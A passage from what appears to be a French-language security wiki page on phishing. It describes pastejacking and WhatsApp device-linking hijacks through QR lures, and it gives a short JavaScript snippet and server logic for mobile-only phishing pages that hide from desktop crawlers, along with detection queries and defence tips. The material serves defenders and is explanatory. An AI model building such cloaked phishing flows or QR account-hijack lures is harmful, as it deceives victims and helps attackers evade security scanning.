## Clipboard Hijacking / Pastejacking

Les attaquants peuvent copier silencieusement des commandes malveillantes dans le presse-papiers de la victime depuis une page web compromise ou typosquattée, puis tromper l’utilisateur pour qu’il les colle dans **Win + R**, **Win + X** ou une fenêtre de terminal, exécutant du code arbitraire sans aucun téléchargement ni pièce jointe.


{{#ref}}
clipboard-hijacking.md
{{#endref}}

## Mobile Phishing & Malicious App Distribution (Android & iOS)


{{#ref}}
mobile-phishing-malicious-apps.md
{{#endref}}

### WhatsApp device-linking hijack via QR social engineering
* Une page leurre (par exemple, un faux “channel” d’un ministère/CERT) affiche un QR WhatsApp Web/Desktop et demande à la victime de le scanner, ajoutant silencieusement l’attaquant comme **linked device**.
* L’attaquant obtient immédiatement la visibilité sur les chats/contacts jusqu’à ce que la session soit supprimée. Les victimes peuvent ensuite voir une notification “new device linked”; les défenseurs peuvent rechercher des événements inattendus de lien de device juste après des visites sur des pages QR non fiables.

### Mobile‑gated phishing to evade crawlers/sandboxes
Les opérateurs placent de plus en plus leurs flux de phishing derrière une simple vérification du device afin que les crawlers desktop n’atteignent jamais les pages finales. Un schéma courant consiste en un petit script qui teste la présence d’un DOM compatible touch et envoie le résultat à un endpoint serveur; les clients non mobiles reçoivent un HTTP 500 (ou une page blanche), tandis que les utilisateurs mobiles reçoivent le flux complet.

Minimal client snippet (typical logic):
```html
<script src="/static/detect_device.js"></script>
```
`detect_device.js` logique (simplifiée):
```javascript
const isMobile = ('ontouchstart' in document.documentElement);
fetch('/detect', {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({is_mobile:isMobile})})
.then(()=>location.reload());
```
Comportement du serveur souvent observé :
- Définit un cookie de session lors du premier chargement.
- Accepte `POST /detect {"is_mobile":true|false}`.
- Renvoie 500 (ou un placeholder) aux GET suivants lorsque `is_mobile=false` ; sert le phishing uniquement si `true`.

Heuristiques de hunting et de détection :
- Requête urlscan : `filename:"detect_device.js" AND page.status:500`
- Télémétrie web : séquence de `GET /static/detect_device.js` → `POST /detect` → HTTP 500 pour les non-mobiles ; les chemins légitimes des victimes mobiles renvoient 200 avec du HTML/JS en suivi.
- Bloquez ou examinez de près les pages qui conditionnent leur contenu exclusivement sur `ontouchstart` ou des vérifications d’appareil similaires.

Conseils de défense :
- Exécutez les crawlers avec des empreintes de type mobile et JS activé pour révéler le contenu protégé.
- Déclenchez une alerte sur les réponses 500 suspectes suivant `POST /detect` sur des domaines nouvellement enregistrés.

## References

- [https://zeltser.com/domain-name-variations-in-phishing/](https://zeltser.com/domain-name-variations-in-phishing/)
- [https://0xpatrik.com/phishing-domains/](https://0xpatrik.com/phishing-domains/)
- [https://darkbyte.net/robando-sesiones-y-bypasseando-2fa-con-evilnovnc/](https://darkbyte.net/robando-sesiones-y-bypasseando-2fa-con-evilnovnc/)
- [https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy)
- [2025 Unit 42 Global Incident Response Report – Social Engineering Edition](https://unit42.paloaltonetworks.com/2025-unit-42-global-incident-response-report-social-engineering-edition/)
- [Silent Smishing – mobile-gated phishing infra and heuristics (Sekoia.io)](https://blog.sekoia.io/silent-smishing-the-hidden-abuse-of-cellular-router-apis/)
- [The Next Frontier of Runtime Assembly Attacks: Leveraging LLMs to Generate Phishing JavaScript in Real Time](https://unit42.paloaltonetworks.com/real-time-malicious-javascript-through-llms/)
- [Love? Actually: Fake dating app used as lure in targeted spyware campaign in Pakistan](https://www.welivesecurity.com/en/eset-research/love-actually-fake-dating-app-used-lure-targeted-spyware-campaign-pakistan/)
- [ESET GhostChat IoCs and samples](https://github.com/eset/malware-ioc/tree/master/ghostchat)
- [Impersonation, Click Hijacking, and TDS: Inside a Malware Distribution Ecosystem](https://research.checkpoint.com/2026/impersonation-click-hijacking-and-tds-inside-a-malware-distribution-ecosystem/)

{{#include ../../banners/hacktricks-training.md}}
